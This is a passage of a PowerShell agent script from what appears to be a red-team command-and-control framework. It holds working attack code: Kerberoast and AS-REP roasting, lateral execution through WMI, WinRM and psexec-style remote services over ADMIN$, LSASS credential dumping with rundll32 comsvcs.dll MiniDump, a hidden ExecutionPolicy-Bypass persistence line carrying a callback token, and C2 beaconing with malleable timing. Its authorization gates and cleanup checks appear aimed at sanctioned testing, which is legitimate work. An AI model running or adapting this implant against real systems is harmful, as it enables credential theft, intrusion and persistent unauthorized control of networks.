    if ($Job.accounts) { foreach ($a in $Job.accounts) { $reqs += @{ user = [string]$a.user; spn = [string]$a.spn } } }
    else { foreach ($a in $accounts) { foreach ($s in $a.spns) { $reqs += @{ user = $a.user; spn = $s } } } }
    $tickets = @()
    foreach ($r in $reqs) {
      try { $tickets += @{ user = $r.user; spn = $r.spn; apreqB64 = (Invoke-VvKerberoastTicket $r.spn) } }
      catch { $tickets += @{ user = $r.user; spn = $r.spn; error = ($_.Exception.Message -replace '[\r\n]+',' ') } }
    }
    $result.tickets = $tickets
  }
  if ($Op -eq 'asrep') {
    $reps = @()
    foreach ($r in @($Job.requests)) {
      try { $reps += @{ user = [string]$r.user; asrepB64 = (Invoke-VvAsReqSplat ([string]$Job.dc) ([Convert]::FromBase64String([string]$r.asreqB64)) 8000) } }
      catch { $reps += @{ user = [string]$r.user; error = ($_.Exception.Message -replace '[\r\n]+',' ') } }
    }
    $result.reps = $reps
  }
  $result.errors = $errs
  $result.at = (Get-Date).ToUniversalTime().ToString('o')
  return (ConvertTo-Json $result -Compress -Depth 8)
}
# ==ADROAST-LIB== end ------------------------------------------------------------------

# ==LATERAL-LIB== begin -----------------------------------------------------------------
# GOVERNED AD TIER, rung 2 (agent legs): the LATERAL EXEC ADAPTERS - wmi
# (Win32_Process.Create over CIM), winrm (Invoke-Command), psexec-class
# (Win32_Service.Create + ADMIN$ result file). The PURE planner/state machine is
# engine/lateralexec.mjs (LateralStore) - THIS lib does the identical dance against
# the real range: pre-probe (a foreign artifact at our planned name is a loud
# 'refused-clobber', never a takeover), exec + result capture, then REMOVE every
# created artifact and PROVE absence by re-read. The manifest (agent sandbox)
# records services created, files dropped, shares touched; remove takes back
# anything lingering; the status sweep refuses 'clean' while artifacts persist.
# -AllowLateral is the agent-side half of the gate (engagement ad.lateral is the
# other). Targets arrive channel-side scope-checked (IP literal inside the signed
# CIDR ring); this lib re-verifies nothing about scope - it trusts the channel's
# refusal, and its own refusals stay loud.
$script:VvLateralOutDir = 'Temp'   # under %SystemRoot% on the target - the ONLY temp class ADMIN$ reaches

function Get-VvLateralCredential($Job) {
  if ($Job.user -and ([string]$Job.user).Trim().Length -gt 0) {
    $u = [string]$Job.user
    if ($Job.domain -and ([string]$Job.domain).Trim().Length -gt 0) { $u = ([string]$Job.domain).Trim() + '\' + $u }
    $sec = ConvertTo-SecureString ([string]$Job.password) -AsPlainText -Force
    return (New-Object System.Management.Automation.PSCredential($u, $sec))
  }
  return $null
}

function Get-VvLateralManifest([string]$Path) {
  try { if (Test-Path $Path) { $m = Get-Content $Path -Raw | ConvertFrom-Json; if ($m -and $m.entries) { return $m } } } catch {}
  return @{ entries = @{} }
}
function Save-VvLateralManifest([string]$Path, $M) {
  try { (ConvertTo-Json $M -Depth 8 -Compress) | Set-Content -Path $Path -Encoding UTF8 } catch {}
}

# Artifact probe/remove against the target. $Sess = an open CIM session (service
# artifacts); files ride the ADMIN$ PSDrive ($Drv). Returns present:$true/$false;
# throws on transport failure (the store doctrine: a failed probe is UNVERIFIED).
function Test-VvLateralArtifact($A, $Sess, [string]$Drv) {
  if ($A.kind -eq 'service') {
    $found = @(Get-CimInstance -CimSession $Sess -ClassName Win32_Service -Filter ("Name='" + $A.name + "'") -ErrorAction Stop)
    return @{ present = ($found.Count -gt 0) }
  }
  if ($A.kind -eq 'file') {
    $rel = ($A.path -replace '^%SystemRoot%\\', '')          # Temp\<tag>.out
    return @{ present = [bool](Test-Path ($Drv + ':\' + $rel)) }
  }
  return @{ present = $null } # share touches are audit records, never probed
}
function Remove-VvLateralArtifact($A, $Sess, [string]$Drv) {
  if ($A.kind -eq 'service') {
    $svc = @(Get-CimInstance -CimSession $Sess -ClassName Win32_Service -Filter ("Name='" + $A.name + "'") -ErrorAction Stop)
    if ($svc.Count -gt 0) {
      try { $null = Invoke-CimMethod -InputObject $svc[0] -MethodName StopService -ErrorAction SilentlyContinue } catch {}
      $rc = (Invoke-CimMethod -InputObject $svc[0] -MethodName Delete -ErrorAction Stop).ReturnValue
      if ($rc -ne 0) { throw "Win32_Service.Delete returned $rc" }
    }
    return
  }
  if ($A.kind -eq 'file') {
    $rel = ($A.path -replace '^%SystemRoot%\\', '')
    Remove-Item -Path ($Drv + ':\' + $rel) -Force -ErrorAction Stop
    return
  }
}

function Open-VvLateralSession([string]$Target, $Cred) {
  $opt = New-CimSessionOption -Protocol Dcom
  if ($Cred) { return (New-CimSession -ComputerName $Target -Credential $Cred -SessionOption $opt -ErrorAction Stop) }
  return (New-CimSession -ComputerName $Target -SessionOption $opt -ErrorAction Stop)
}
function Open-VvLateralShare([string]$Target, $Cred, [string]$Tag) {
  $drv = ('vx' + ($Tag -replace '[^A-Za-z0-9]', ''))
  if ($drv.Length -gt 20) { $drv = $drv.Substring(0, 20) }
  $params = @{ Name = $drv; PSProvider = 'FileSystem'; Root = ("\\$Target\ADMIN$"); ErrorAction = 'Stop' }
  if ($Cred) { $params.Credential = $Cred }   # -Credential $null would prompt/throw — splat it only when present
  $null = New-PSDrive @params
  return $drv
}

# The exec op - mirrors LateralStore.exec() exactly: pre-probe, run, capture, clean,
# verify, record. Returns the per-name evidence object.
function Invoke-VvLateralExec($Job, [string]$ManifestPath) {
  $tag = [string]$Job.name
  $adapter = ([string]$Job.adapter).ToLower()
  $target = [string]$Job.target
  $cmd = [string]$Job.command
  $ev = [ordered]@{ state = 'failed'; adapter = $adapter; target = $target; exitCode = $null; outputTail = $null; outputSha256 = $null; artifacts = @(); removalVerified = $false; note = $null; error = $null }
  if ($cmd.Contains('"')) { $ev.error = 'the command contains a double-quote - the cmd /c wrapper cannot quote it safely (refused loudly, nothing executed)'; return $ev }
  $m = Get-VvLateralManifest $ManifestPath
  $planned = @()
  if ($adapter -eq 'wmi') { $planned = @(
    @{ kind = 'file'; role = 'result-capture'; path = "%SystemRoot%\$($script:VvLateralOutDir)\$tag.out"; host = $target },
    @{ kind = 'share'; role = 'result-read'; name = 'ADMIN$'; host = $target }) }
  elseif ($adapter -eq 'psexec') { $planned = @(
    @{ kind = 'service'; role = 'exec-host'; name = $tag; host = $target },
    @{ kind = 'file'; role = 'result-capture'; path = "%SystemRoot%\$($script:VvLateralOutDir)\$tag.out"; host = $target },
    @{ kind = 'share'; role = 'result-read'; name = 'ADMIN$'; host = $target }) }
  elseif ($adapter -eq 'winrm') { $planned = @() }
  else { $ev.error = "unknown adapter $adapter"; return $ev }

  $cred = Get-VvLateralCredential $Job
  $sess = $null; $drv = $null
  try {
    # 1. PRE-PROBE (never clobber/hijack a foreign artifact)
    if ($adapter -ne 'winrm') {
      $sess = Open-VvLateralSession $target $cred
      if ($planned | Where-Object { $_.kind -eq 'file' }) { $drv = Open-VvLateralShare $target $cred $tag }
      foreach ($a in $planned) {
        if ($a.kind -eq 'share') { continue }
        $pre = Test-VvLateralArtifact $a $sess $drv
        if ($pre.present -eq $true) {
          $ours = $m.entries.$tag
          if (-not $ours) {
            $ev.state = 'refused-clobber'
            $ev.error = 'planned ' + $a.kind + ' artifact already EXISTS on the target (' + $(if ($a.name) { $a.name } else { $a.path }) + ') and is NOT ours - REFUSED to clobber or hijack it. Pick another name handle, or lateral-remove ours first.'
            $ev.artifacts += ($a + @{ present = $true; created = $false; removalVerified = $null })
            return $ev
          }
        }
      }
    }

    # 2. EXECUTE + result capture
    $out = ''
    if ($adapter -eq 'winrm') {
      $splat = @{ ComputerName = $target; ErrorAction = 'Stop'; ScriptBlock = { param($c) $o = & cmd.exe /c $c 2>&1 | Out-String; "VXEXIT:$LASTEXITCODE"; $o } ; ArgumentList = $cmd }
      if ($cred) { $splat.Credential = $cred }
      $resp = @(Invoke-Command @splat)
      $ev.exitCode = 0
      if ($resp.Count -gt 0 -and "$($resp[0])" -match '^VXEXIT:(-?\d+)') { $ev.exitCode = [int]$Matches[1]; $out = ($resp | Select-Object -Skip 1) -join "`n" } else { $out = $resp -join "`n" }
    } else {
      $bin = 'cmd.exe /c "' + $cmd + ' > %SystemRoot%\' + $script:VvLateralOutDir + '\' + $tag + '.out 2>&1"'
      if ($adapter -eq 'wmi') {
        $r = Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $bin; CurrentDirectory = 'C:\Windows\Temp' } -ErrorAction Stop
        if ($r.ReturnValue -ne 0) { throw "Win32_Process.Create returned $($r.ReturnValue)" }
        $wpid = $r.ProcessId
        $sw = [Diagnostics.Stopwatch]::StartNew()
        while ($sw.Elapsed.TotalSeconds -lt 30) { $p = @(Get-CimInstance -CimSession $sess -ClassName Win32_Process -Filter "ProcessId=$wpid" -ErrorAction SilentlyContinue); if ($p.Count -eq 0) { break }; Start-Sleep -Milliseconds 400 }
        $ev.exitCode = $null # win32_process create reports launch, not the remote exit code - said plainly
      } else { # psexec-class
        $rc = (Invoke-CimMethod -CimSession $sess -ClassName Win32_Service -MethodName Create -Arguments @{ Name = $tag; DisplayName = $tag; PathName = $bin; ServiceType = [uint32]16; ErrorControl = [uint32]1; StartMode = 'Manual'; DesktopInteract = $false; StartName = $null; StartPassword = $null; LoadOrderGroup = $null; LoadOrderGroupDependencies = $null; ServiceDependencies = $null } -ErrorAction Stop).ReturnValue
        if ($rc -ne 0) { throw "Win32_Service.Create returned $rc" }
        $svc = @(Get-CimInstance -CimSession $sess -ClassName Win32_Service -Filter ("Name='" + $tag + "'") -ErrorAction Stop)
        $rc = (Invoke-CimMethod -InputObject $svc[0] -MethodName StartService -ErrorAction Stop).ReturnValue
        if ($rc -ne 0) { throw "StartService returned $rc" }
        $sw = [Diagnostics.Stopwatch]::StartNew()
        while ($sw.Elapsed.TotalSeconds -lt 30) { $st = (Get-CimInstance -CimSession $sess -ClassName Win32_Service -Filter ("Name='" + $tag + "'") -ErrorAction SilentlyContinue).State; if ($st -eq 'Stopped') { break }; Start-Sleep -Milliseconds 400 }
        $ev.exitCode = $null # the service wrapper's exit is not the command's - said plainly
      }
      Start-Sleep -Milliseconds 600
      $rel = $script:VvLateralOutDir + '\' + $tag + '.out'
      if (Test-Path ($drv + ':\' + $rel)) { $out = Get-Content ($drv + ':\' + $rel) -Raw -ErrorAction SilentlyContinue }
    }
    $out = [string]$out
    $ev.outputTail = $(if ($out.Length -gt 800) { $out.Substring($out.Length - 800) } else { $out })
    $ev.outputSha256 = Get-Sha256Hex ([Text.Encoding]::UTF8.GetBytes($out))
    $ev.state = 'ran'
    foreach ($a in $planned) { $ev.artifacts += ($a + @{ present = $(if ($a.kind -eq 'share') { $null } else { $true }); created = ($a.kind -ne 'share'); removalVerified = $null }) }

    # 3. CLEANUP-PROOF: remove every created artifact, verify absence by re-read.
    $cleanErr = @()
    if ($adapter -ne 'winrm') {
      foreach ($a in $planned) {
        if ($a.kind -eq 'share') { continue }
        try {
          Remove-VvLateralArtifact $a $sess $drv
          $post = Test-VvLateralArtifact $a $sess $drv
          $ok = ($post.present -eq $false)
          foreach ($rec in $ev.artifacts) { if ($rec.kind -eq $a.kind -and $rec.name -eq $a.name -and $rec.path -eq $a.path) { $rec.removalVerified = $ok; $rec.present = (-not $ok) } }
          if (-not $ok) { $cleanErr += ($a.kind + ' ' + $(if ($a.name) { $a.name } else { $a.path }) + ' STILL PRESENT on re-read') }
        } catch {
          foreach ($rec in $ev.artifacts) { if ($rec.kind -eq $a.kind -and $rec.name -eq $a.name -and $rec.path -eq $a.path) { $rec.removalVerified = $false } }
          $cleanErr += ($a.kind + ' removal failed: ' + ($_.Exception.Message -replace '[\r\n]+', ' '))
        }
      }
    }
    if ($cleanErr.Count -gt 0) { $ev.state = 'removal-failed'; $ev.error = 'CLEANUP-PROOF FAILED: ' + ($cleanErr -join '; ') + ' (loud, escalated; the engagement cannot be called clean)' }
    $ev.removalVerified = ($ev.state -eq 'ran')
  } catch {
    $ev.error = ($_.Exception.Message -replace '[\r\n]+', ' ')
    if ($ev.state -ne 'refused-clobber') { $ev.state = 'failed' }
  } finally {
    if ($drv) { try { Remove-PSDrive -Name $drv -Force -ErrorAction SilentlyContinue } catch {} }
    if ($sess) { try { Remove-CimSession $sess -ErrorAction SilentlyContinue } catch {} }
  }
  # 4. MANIFEST (the accountability trail on the agent's sandbox)
  $entry = @{ adapter = $adapter; target = $target; user = $(if ($Job.user) { [string]$Job.user } else { $null }); commandSha256 = (Get-Sha256Hex ([Text.Encoding]::UTF8.GetBytes($cmd))); artifacts = @($planned | ForEach-Object { @{ kind = $_.kind; role = $_.role; name = $(if ($_.name) { $_.name } else { $null }); path = $(if ($_.path) { $_.path } else { $null }); host = $_.host } }); state = $ev.state; exitCode = $ev.exitCode; ranAt = (Get-Date).ToUniversalTime().ToString('o'); removedAt = $null; removalVerified = $ev.removalVerified }
  $m.entries | Add-Member -NotePropertyName $tag -NotePropertyValue $entry -Force
  Save-VvLateralManifest $ManifestPath $m
  return $ev
}

# The remove op - take back anything lingering under a name (or all), verify by re-read.
function Invoke-VvLateralRemove($Job, [string]$ManifestPath) {
  $m = Get-VvLateralManifest $ManifestPath
  $names = @{}
  $targets = @()
  if ($Job.all -eq $true) { $targets = @($m.entries.PSObject.Properties.Name) }
  elseif ($Job.name) { $targets = @([string]$Job.name) }
  $anyFail = $false
  foreach ($tag in $targets) {
    $entry = $m.entries.$tag
    $ev = [ordered]@{ state = 'removed'; adapter = $(if ($entry) { $entry.adapter } else { $null }); target = $(if ($entry) { $entry.target } else { $null }); exitCode = $null; artifacts = @(); removalVerified = $true; error = $null }
    if (-not $entry) { $ev.state = 'removed'; $ev.error = $null; $names[$tag] = $ev; continue }
    $cred = Get-VvLateralCredential $Job
    $sess = $null; $drv = $null
    try {
      $sess = Open-VvLateralSession ([string]$entry.target) $cred
      if ($entry.artifacts | Where-Object { $_.kind -eq 'file' }) { $drv = Open-VvLateralShare ([string]$entry.target) $cred $tag }
      foreach ($a in $entry.artifacts) {
        if ($a.kind -eq 'share') { $ev.artifacts += @{ kind = 'share'; name = $a.name; host = $a.host; present = $null; removalVerified = $null }; continue }
        $rec = @{ kind = $a.kind; role = $a.role; name = $a.name; path = $a.path; host = $a.host; present = $null; removalVerified = $false }
        $pre = Test-VvLateralArtifact $a $sess $drv
        if ($pre.present -eq $true) { Remove-VvLateralArtifact $a $sess $drv }
        $post = Test-VvLateralArtifact $a $sess $drv
        $rec.present = ($post.present -eq $true); $rec.removalVerified = ($post.present -eq $false)
        if (-not $rec.removalVerified) { $anyFail = $true; $ev.state = 'removal-failed'; $ev.removalVerified = $false; $ev.error = 'artifact STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated)' }
        $ev.artifacts += $rec
      }
    } catch { $anyFail = $true; $ev.state = 'removal-failed'; $ev.removalVerified = $false; $ev.error = ($_.Exception.Message -replace '[\r\n]+', ' ') }
    finally { if ($drv) { try { Remove-PSDrive $drv -Force -ErrorAction SilentlyContinue } catch {} }; if ($sess) { try { Remove-CimSession $sess -ErrorAction SilentlyContinue } catch {} } }
    if ($ev.state -eq 'removed') { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = (Get-Date).ToUniversalTime().ToString('o') }
    else { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
    $names[$tag] = $ev
  }
  Save-VvLateralManifest $ManifestPath $m
  return [ordered]@{ op = 'remove'; pid = $PID; state = $(if ($anyFail) { 'removal-failed' } else { 'removed' }); names = $names; at = (Get-Date).ToUniversalTime().ToString('o') }
}

# The status sweep - every manifest entry re-probed LIVE (measured now, never remembered).
function Invoke-VvLateralStatus($Job, [string]$ManifestPath) {
  $m = Get-VvLateralManifest $ManifestPath
  $targets = @()
  if ($Job.name) { $targets = @([string]$Job.name) } else { $targets = @($m.entries.PSObject.Properties.Name) }
  $entries = @(); $open = @()
  foreach ($tag in $targets) {
    $entry = $m.entries.$tag
    if (-not $entry) { $entries += @{ name = $tag; adapter = $null; target = $null; state = 'absent'; removalVerified = $true }; continue }
    $st = 'clean'; $rv = $true
    $sess = $null; $drv = $null
    try {
      $cred = $null
      $sess = Open-VvLateralSession ([string]$entry.target) $cred
      if ($entry.artifacts | Where-Object { $_.kind -eq 'file' }) { $drv = Open-VvLateralShare ([string]$entry.target) $cred $tag }
      foreach ($a in $entry.artifacts) {
        if ($a.kind -eq 'share') { continue }
        $cur = Test-VvLateralArtifact $a $sess $drv
        if ($cur.present -eq $true) { $st = 'present'; $rv = $false }
      }
    } catch { $st = 'unknown'; $rv = $false }
    finally { if ($drv) { try { Remove-PSDrive $drv -Force -ErrorAction SilentlyContinue } catch {} }; if ($sess) { try { Remove-CimSession $sess -ErrorAction SilentlyContinue } catch {} } }
    $rec = @{ name = $tag; adapter = $entry.adapter; target = $entry.target; state = $st; removalVerified = $rv }
    $entries += $rec
    if (-not $rv) { $open += $rec }
  }
  return [ordered]@{ op = 'status'; pid = $PID; state = $(if ($open.Count -eq 0) { 'clean' } else { 'unclean' }); clean = ($open.Count -eq 0); entries = $entries; open = $open; at = (Get-Date).ToUniversalTime().ToString('o') }
}
# ==LATERAL-LIB== end -------------------------------------------------------------------

# ==CREDHOST-LIB== begin ----------------------------------------------------------------
# GOVERNED AD TIER, rung 3 (agent leg): CREDENTIAL ACCESS - LSASS VIA COMSVCS. The
# published LOLBin call: rundll32.exe comsvcs.dll, MiniDump <lsass-pid> <path> full -
# a Microsoft-signed binary writing the dump INTO THE GOVERNED SANDBOX. THE DUMP
# NEVER RIDES THE CHANNEL: the audit trail carries sha256 + bytes + the MINIDUMP
# MARKER verdict only; offline parse is operator-side tooling; retrieval rides the
# governed artifact-fetch path. Elevation honesty: a non-elevated agent cannot touch
# lsass - the evidence says 'failed' plainly, never a fabricated dump. Removal is
# verified by re-read (hash-guarded: we never delete bytes we did not write); the
# sweep refuses 'clean' while a dump persists. -AllowCredAccess is the agent-side
# half of the gate (engagement cred.access is the other). edrview PAIRING IS
# MANDATORY: LSASS access is the most-watched event in enterprise defense - the
# measure (Sysmon 10 / Security 4656+4663 / Defender behavior) is the point.
function Get-VvCredManifest([string]$Path) {
  try { if (Test-Path $Path) { $m = Get-Content $Path -Raw | ConvertFrom-Json; if ($m -and $m.entries) { return $m } } } catch {}
  return @{ entries = @{} }
}
function Save-VvCredManifest([string]$Path, $M) {
  try { (ConvertTo-Json $M -Depth 8 -Compress) | Set-Content -Path $Path -Encoding UTF8 } catch {}
}

# The MINIDUMP marker check (mirror of engine/credaccess.mjs validateMinidump -
# marker-level ONLY: signature, stream count + directory bounds. NEVER a content read).
function Test-VvMdmpMarker([string]$Path) {
  try {
    $len = (Get-Item $Path).Length
    if ($len -lt 32) { return @{ valid = $false; streams = 0; reason = "too small for a MINIDUMP_HEADER ($len bytes) - a failed dump leaves a 0-byte stub" } }
    $fs = [IO.File]::OpenRead($Path)
    try {
      $hdr = New-Object byte[] 32
      $null = $fs.Read($hdr, 0, 32)
      if ($hdr[0] -ne 0x4D -or $hdr[1] -ne 0x44 -or $hdr[2] -ne 0x4D -or $hdr[3] -ne 0x50) { return @{ valid = $false; streams = 0; reason = 'bad signature - not a MINIDUMP (want MDMP)' } }
      $streams = [BitConverter]::ToUInt32($hdr, 8)
      $dirRva = [BitConverter]::ToUInt32($hdr, 12)
      if ($streams -lt 1 -or $streams -gt 256) { return @{ valid = $false; streams = 0; reason = "stream count $streams outside the sane band" } }
      if ($dirRva + $streams * 12 -gt $len) { return @{ valid = $false; streams = 0; reason = 'stream directory overruns the file - truncated dump' } }
      return @{ valid = $true; streams = [int]$streams; reason = $null }
    } finally { $fs.Close() }
  } catch { return @{ valid = $false; streams = 0; reason = ($_.Exception.Message -replace '[\r\n]+', ' ') } }
}

function Invoke-VvCredDump($Job, [string]$Sandbox, [string]$ManifestPath) {
  $name = [string]$Job.name
  $ev = [ordered]@{ state = 'failed'; name = $name; technique = 'lsass-comsvcs-minidump'; pid = $null; dumpPath = $null; sha256 = $null; bytes = $null; mdmpValid = $false; streams = $null; removalVerified = $null; error = $null }
  $path = Join-Path $Sandbox ($name + '.dmp')
  $ev.dumpPath = $path
  if ($path.Contains(' ')) { $ev.error = 'the dump path contains a space - comsvcs MiniDump parses its args on whitespace (a documented LOLBin quirk); point -Sandbox at a space-free path. Nothing attempted.'; return $ev }
  $m = Get-VvCredManifest $ManifestPath
  if ((Test-Path $path) -and -not $m.entries.$name) { $ev.state = 'refused-clobber'; $ev.error = 'the dump path already holds a file this tier never wrote - REFUSED to clobber it. cred-dump-remove ours first, or pick another name handle.'; return $ev }
  $principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
  if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ev.error = 'not elevated - LSASS needs SeDebugPrivilege; a non-elevated agent gets access-denied. Reported honestly: no dump was attempted.'
    return $ev
  }
  $dumpPid = $null
  if ($Job.pid) { $dumpPid = [int]$Job.pid }
  else { $proc = @(Get-Process -Name lsass -ErrorAction SilentlyContinue); if ($proc.Count -ne 1) { $ev.error = "lsass resolution failed ($($proc.Count) matches)"; return $ev }; $dumpPid = $proc[0].Id }
  $ev.pid = $dumpPid
  $arg = 'C:\Windows\System32\comsvcs.dll, MiniDump ' + $dumpPid + ' ' + $path + ' full'
  try {
    $p = Start-Process -FilePath 'rundll32.exe' -ArgumentList $arg -WindowStyle Hidden -PassThru
    if (-not $p.WaitForExit(30000)) { try { $p.Kill() } catch {}; throw 'rundll32 comsvcs MiniDump timed out (30s) - killed' }
  } catch { $ev.error = ($_.Exception.Message -replace '[\r\n]+', ' '); return $ev }
  if (-not (Test-Path $path)) { $ev.error = 'the signed-host call produced no dump file - access-denied or a failed dump; nothing claimed'; return $ev }
  $ev.sha256 = Get-Sha256Hex ([IO.File]::ReadAllBytes($path))
  $ev.bytes = [int](Get-Item $path).Length
  $marker = Test-VvMdmpMarker $path
  $ev.mdmpValid = $marker.valid; $ev.streams = $marker.streams
  if (-not $marker.valid) {
    try { Remove-Item $path -Force -ErrorAction SilentlyContinue } catch {}
    $ev.error = 'the artifact failed the MINIDUMP marker check (' + $marker.reason + ') - the stub was removed; nothing claimed'
    $entry = @{ technique = $ev.technique; dumpPath = $path; pid = $dumpPid; sha256 = $ev.sha256; bytes = $ev.bytes; mdmpValid = $false; streams = $ev.streams; state = 'failed'; dumpedAt = (Get-Date).ToUniversalTime().ToString('o'); removedAt = $null; removalVerified = $null }
    $m.entries | Add-Member -NotePropertyName $name -NotePropertyValue $entry -Force
    Save-VvCredManifest $ManifestPath $m
    return $ev
  }
  $ev.state = 'dumped'
  $entry = @{ technique = $ev.technique; dumpPath = $path; pid = $dumpPid; sha256 = $ev.sha256; bytes = $ev.bytes; mdmpValid = $true; streams = $ev.streams; state = 'dumped'; dumpedAt = (Get-Date).ToUniversalTime().ToString('o'); removedAt = $null; removalVerified = $false }
  $m.entries | Add-Member -NotePropertyName $name -NotePropertyValue $entry -Force
  Save-VvCredManifest $ManifestPath $m
  return $ev
}

function Invoke-VvCredRemove($Job, [string]$ManifestPath) {
  $m = Get-VvCredManifest $ManifestPath
  $targets = @()
  if ($Job.all -eq $true) { $targets = @($m.entries.PSObject.Properties.Name) }
  elseif ($Job.name) { $targets = @([string]$Job.name) }
  $names = @{}; $anyFail = $false
  foreach ($name in $targets) {
    $entry = $m.entries.$name
    $ev = [ordered]@{ state = 'removed'; name = $name; technique = 'lsass-comsvcs-minidump'; pid = $(if ($entry) { $entry.pid } else { $null }); dumpPath = $(if ($entry) { $entry.dumpPath } else { $null }); sha256 = $(if ($entry) { $entry.sha256 } else { $null }); bytes = $(if ($entry) { $entry.bytes } else { $null }); mdmpValid = $(if ($entry) { [bool]$entry.mdmpValid } else { $false }); streams = $(if ($entry) { $entry.streams } else { $null }); removalVerified = $true; error = $null }
    if (-not $entry) { $names[$name] = $ev; continue }
    try {
      if (Test-Path $entry.dumpPath) {
        $live = Get-Sha256Hex ([IO.File]::ReadAllBytes($entry.dumpPath))
        if ($entry.sha256 -and $live -ne $entry.sha256) {
          $ev.state = 'refused-foreign'; $ev.removalVerified = $false; $anyFail = $true
          $ev.error = 'the dump path now holds DIFFERENT bytes than what we dumped - REFUSED to delete what we did not write (LOUD; escalate)'
          $names[$name] = $ev; continue
        }
        Remove-Item $entry.dumpPath -Force -ErrorAction Stop
      }
      if (Test-Path $entry.dumpPath) {
        $ev.state = 'removal-failed'; $ev.removalVerified = $false; $anyFail = $true
        $ev.error = 'remove executed but the dump file is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated)'
      } else {
        $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = (Get-Date).ToUniversalTime().ToString('o')
      }
    } catch { $ev.state = 'removal-failed'; $ev.removalVerified = $false; $anyFail = $true; $ev.error = ($_.Exception.Message -replace '[\r\n]+', ' ') }
    $names[$name] = $ev
  }
  Save-VvCredManifest $ManifestPath $m
  return [ordered]@{ op = 'remove'; pid = $PID; state = $(if ($anyFail) { 'removal-failed' } else { 'removed' }); names = $names; at = (Get-Date).ToUniversalTime().ToString('o') }
}

function Invoke-VvCredStatus([string]$ManifestPath) {
  $m = Get-VvCredManifest $ManifestPath
  $entries = @(); $open = @()
  foreach ($name in @($m.entries.PSObject.Properties.Name)) {
    $entry = $m.entries.$name
    $present = Test-Path $entry.dumpPath
    $st = $(if ($present) { 'present' } else { 'clean' })
    $rec = @{ name = $name; dumpPath = $entry.dumpPath; sha256 = $entry.sha256; state = $st; removalVerified = (-not $present) }
    $entries += $rec
    if ($present) { $open += $rec }
  }
  return [ordered]@{ op = 'status'; pid = $PID; state = $(if ($open.Count -eq 0) { 'clean' } else { 'unclean' }); clean = ($open.Count -eq 0); entries = $entries; open = $open; at = (Get-Date).ToUniversalTime().ToString('o') }
}
# ==CREDHOST-LIB== end ------------------------------------------------------------------

# GOVERNED PERSISTENCE TIER (roadmap #8): the relaunch line THIS agent installs as
# persistence - captured HERE, agent-side, from its own live launch parameters (the
# channel never ships a command line). Same binary, same script, same config = the same
# agent comes back on logon. HONEST NOTE: the line embeds the callback token; every
# stage-1 location is USER-context and user-readable by construction (HKCU, the user's
# own tasks, the user's own Startup folder) - the same privilege class as the agent
# itself. The removal manifest lives in the sandbox (the agent's confinement zone).
$script:VvAgentExe = (Get-Process -Id $PID).Path
$script:VvRelaunchLine = '"' + $script:VvAgentExe + '" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
$script:VvRelaunchLine += ' -Url "' + $Url + '" -AgentId "' + $AgentId + '" -Token "' + $Token + '" -Sandbox "' + $Sandbox + '"'
$script:VvRelaunchLine += ' -Interval ' + $Interval + ' -Jitter ' + $Jitter + ' -Transport ' + $Transport
if ($AllowInMemoryExec) { $script:VvRelaunchLine += ' -AllowInMemoryExec' }
if ($AllowEvasion) { $script:VvRelaunchLine += ' -AllowEvasion' }
if ($AllowPersist) { $script:VvRelaunchLine += ' -AllowPersist' }
if ($AllowProxyExec) { $script:VvRelaunchLine += ' -AllowProxyExec' }
if ($AllowAdRoast) { $script:VvRelaunchLine += ' -AllowAdRoast' }
if ($AllowLateral) { $script:VvRelaunchLine += ' -AllowLateral' }
if ($AllowCredAccess) { $script:VvRelaunchLine += ' -AllowCredAccess' }
$script:VvPersistManifestPath = Join-Path $Sandbox 'varvel-persist-manifest.json'
$script:VvPersistName = Get-VvPersistTag ($AgentId + '|' + $Url)   # deterministic handle: VARVEL-<sha8>
$script:VvExecProxyManifestPath = Join-Path $Sandbox 'varvel-execproxy-manifest.json'
$script:VvProxyName = Get-VvProxyTag ($AgentId + '|' + $Url)       # deterministic handle: VARVEL-<sha8>
$script:VvLateralManifestPath = Join-Path $Sandbox 'varvel-lateral-manifest.json'
$script:VvCredManifestPath = Join-Path $Sandbox 'varvel-cred-manifest.json'

function Invoke-Pull {
  $script:Seq++
  $auth = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':pull')
  try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('x-agent', $AgentId)
    $wc.Headers.Add('x-seq', "$($script:Seq)")
    $wc.Headers.Add('x-auth', $auth)
    $bytes = $wc.DownloadData("$Url/c")
    # ANY HTTP response proves the wire is alive (incl. 204 idle / a filtered 403).
    $script:LastPullOk = $true
    # Malleable C2: adopt a channel-assigned timing profile live (interval+jitter; burst v2)
    $prof = $wc.ResponseHeaders['x-varvel-profile']
    if ($prof) {
      try {
        $p = $prof | ConvertFrom-Json
        $script:Interval = [Math]::Max(200, [int]$p.intervalMs)
        $script:Jitter = [Math]::Max(0, [int]$p.jitterMs)
      } catch {}
    }
    # Channel-assigned transport switch (gap#5): honored on the next cycle when workable.
    $tt = $wc.ResponseHeaders['x-varvel-transport']
    if ($tt) { $script:AssignedTransport = ([string]$tt).Trim().ToLower() }
    if ($null -eq $bytes -or $bytes.Length -eq 0) { return $null }  # 204 = idle
    return ([Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
  } catch [System.Net.WebException] {
    # A WebException WITH a Response still means SOMETHING answered on the wire (403/5xx).
    $script:LastPullOk = ($null -ne $_.Exception.Response)
    return $null
  }  # non-2xx (incl. killed-agent 204s) = idle to us
  catch { Write-Host ('  [pull error: ' + $_.Exception.Message + ']'); $script:LastPullOk = $false; return $null }
}

function Invoke-Push([string]$TaskId, [byte[]]$Body) {
  $script:Seq++
  $hash = Get-Sha256Hex $Body
  $auth = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':' + $TaskId + ':' + $hash)
  try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('x-agent', $AgentId)
    $wc.Headers.Add('x-seq', "$($script:Seq)")
    $wc.Headers.Add('x-task', $TaskId)
    $wc.Headers.Add('x-auth', $auth)
    $wc.UploadData("$Url/r", 'POST', $Body) | Out-Null
